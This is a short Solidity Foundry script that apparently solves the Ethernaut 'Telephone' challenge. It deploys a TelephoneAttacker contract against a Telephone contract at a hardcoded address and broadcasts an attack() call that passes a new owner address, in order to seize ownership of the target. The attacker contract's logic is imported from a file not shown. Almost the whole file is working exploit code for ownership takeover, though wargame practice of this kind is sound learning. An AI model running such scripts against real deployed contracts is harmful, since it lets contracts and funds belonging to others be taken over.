// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../src/Telephone.sol";
import {TelephoneAttacker} from "../src/TelephoneAttacker.sol";
import {Script} from "forge-std/Script.sol";

contract TelephoneAttackerScript is Script {
    Telephone target;
    TelephoneAttacker attacker;

    function run() public {
        target = Telephone(0x3a2Da09155EaCE551fdF4768546B1713971099aa);
        vm.startBroadcast();
        attacker = new TelephoneAttacker(address(target));
        attack(0x50420Ad35e96cDb0fD2770341c72497b3518d2C5);
        vm.stopBroadcast();
    }

    function attack(address _owner) public {
        attacker.attack(_owner);
    }
}